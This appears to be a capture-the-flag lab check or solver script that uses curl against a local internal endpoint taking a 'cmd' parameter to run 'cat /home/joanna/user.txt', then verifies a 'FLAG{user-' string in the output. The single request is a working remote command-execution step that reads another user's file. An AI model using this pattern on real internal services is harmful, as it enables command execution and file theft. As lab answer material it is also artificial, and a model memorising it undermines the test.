set -eu
out=$(curl -fsS "http://127.0.0.1:52846/internal/run?cmd=cat%20/home/joanna/user.txt")
echo "$out"
echo "$out" | grep -q 'FLAG{user-' || { echo "internal site did not run as joanna" >&2; exit 1; }
